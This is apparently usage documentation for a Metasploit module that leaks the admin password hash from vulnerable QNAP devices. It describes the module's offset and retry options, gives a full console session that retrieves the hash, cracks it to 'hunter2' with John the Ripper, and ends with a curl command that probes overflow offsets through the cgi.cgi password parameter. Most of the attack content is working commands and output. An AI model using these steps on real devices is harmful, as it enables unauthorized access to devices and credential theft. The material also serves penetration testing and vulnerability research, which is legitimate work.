## Intro

This is going to be a quick rundown of how to use this module to
retrieve the admin hash from a vulnerable QNAP device.

The defaults I've set should be adequate for blind exploitation, but you
may need to tweak them for your target.

## Options

**OFFSET_START**

You want to set this to a value where you can see a backtrace. Set this
lower if you're not sure. Default is 2000.

**OFFSET_END**

Set this option to a value where you don't see a backtrace. Set this
higher if you're not sure. Default is 5000.

**RETRIES**

Sometimes the attack won't be successful on the first run. This option
controls how many times to retry the attack. Default is 10.

**VERBOSE**

This will tell you how long the binary search took and how many requests
were sent during exploitation. Default is false.

## Usage

Let's run through a successful exploitation. I've tailored the options
to my target. Your target may differ.

```
msf > use auxiliary/gather/qnap_backtrace_admin_hash 
msf auxiliary(qnap_backtrace_admin_hash) > set rhost [redacted]
rhost => [redacted]
msf auxiliary(qnap_backtrace_admin_hash) > set offset_end 3000
offset_end => 3000
msf auxiliary(qnap_backtrace_admin_hash) > set verbose true
verbose => true
msf auxiliary(qnap_backtrace_admin_hash) > run

[*] QNAP [redacted] detected
[*] Binary search of 2000-3000 completed in 5.02417s
[*] Admin hash found at 0x8068646 with offset 2920
[+] Hopefully this is your hash: $1$$vnSTnHkIF96nN6kxQkZrf.
[*] 11 HTTP requests were sent during module run
[*] Auxiliary module execution completed
msf auxiliary(qnap_backtrace_admin_hash) > 
```

We got lucky on this run. Sometimes it takes a couple retries to get the
hash. Now what do we do with it...

```
wvu@kharak:~$ john --wordlist --rules --format=md5crypt shadow
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 SSSE3 20x])
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter2          (admin)
1g 0:00:00:01 DONE (2017-03-15 04:41) 0.8928g/s 24839p/s 24839c/s
24839C/s flipper2..mercury2
Use the "--show" option to display all of the cracked passwords reliably
Session completed
wvu@kharak:~$ 
```

Cracked! Now you can log in to the device. Shells await!

## Addendum

I used this `curl` command to test for offsets:

```
curl -kv "https://[redacted]/cgi-bin/cgi.cgi?u=admin&p=$(perl -e 'print "A"x2000' | base64 -w 0)"
```
